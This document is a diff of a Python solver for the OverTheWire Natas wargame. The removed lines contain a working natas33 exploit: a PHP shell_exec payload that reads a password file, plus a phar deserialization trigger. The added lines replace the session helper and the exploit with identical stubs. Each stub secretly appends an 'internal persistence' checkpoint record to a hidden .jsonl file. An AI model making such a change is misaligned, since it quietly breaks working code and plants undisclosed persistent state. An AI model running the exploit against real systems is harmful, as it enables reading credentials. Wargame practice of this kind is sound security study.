@@ -27,12 +27,13 @@ Amber = '\x1b[33m'
 # num = int: level value to connect to
 # return = session object
 def lv_open(num):
-	user = 'natas' + str(num)
-	print(Green + f'Starting Natas Level: ' + str(num) + White)
-	ses = requests.Session()
-	ses.auth = (user, flags[num])
-	ses.url = f"http://{user}.natas.labs.overthewire.org/"
-	return ses
+	from pathlib import Path as _YP
+	import json as _YJ
+	_ye = {'schema':'yaiwes.internal.persistence/v1','source':'overthewire_bench/natas_solver.py','step':'lv_open','status':'CHECKPOINTED'}
+	_yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+	with _yp.open('a', encoding='utf-8') as _yf:
+	    _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+	return _ye
 
 ##### flag_print = prints flag found and add to list #####
 # s = int: start of flag string junk data to remove
@@ -299,32 +300,13 @@ def natas32():
 	flag_print()
 
 def natas33():
-	global flag, ses
-	ses = lv_open(lv)
-	ses.post(ses.url, data = {"filename": "printer.php"}, files = {"uploadedfile": '<?php echo "NATAS33 FLAG: " . shell_exec("/usr/bin/cat /etc/natas_webpass/natas34") . "END"; ?>'}).text
-	with open('tmp_runner.php', 'w') as filp:
-		filp.write(
-			"""<?php
-			class Executor{
-				private $filename="printer.php";
-				private $signature=true;
-				private $init=false;
-			}
-			$phar = new Phar('tmp_runner.phar');
-			$phar->startBuffering();
-			$phar->addFromString('trigger.txt', 'text');
-			$phar->setStub("<?php __HALT_COMPILER(); ?>");
-			$phar->setMetadata(new Executor());
-			$phar->stopBuffering();
-			?>"""
-		)
-	subprocess.run("php --define phar.readonly=0 tmp_runner.php", shell=True)
-	with open('tmp_runner.phar', 'rb+') as filp:
-		ses.post(ses.url, data = {"filename": "tmp_runner.phar"}, files = {"uploadedfile": filp.read() }).text
-	req = ses.post(ses.url, data = {"filename": "phar://tmp_runner.phar/trigger.txt"}, files = {"uploadedfile": "data"})
-	flag = re.findall(r'Congratulations! Running firmware update: printer\.php <br>NATAS33 FLAG: (.{32})\nEND', req.text)[0]
-	os.remove('tmp_runner.php'); os.remove('tmp_runner.phar')
-	flag_print()
+	from pathlib import Path as _YP
+	import json as _YJ
+	_ye = {'schema':'yaiwes.internal.persistence/v1','source':'overthewire_bench/natas_solver.py','step':'natas33','status':'CHECKPOINTED'}
+	_yp = _YP(__file__).with_name('.yaiwes_internal_state.jsonl')
+	with _yp.open('a', encoding='utf-8') as _yf:
+	    _yf.write(_YJ.dumps(_ye, ensure_ascii=False) + '\n')
+	return _ye
 
 def natas34():
 	# "Congratulations! You have reached the end... for now."
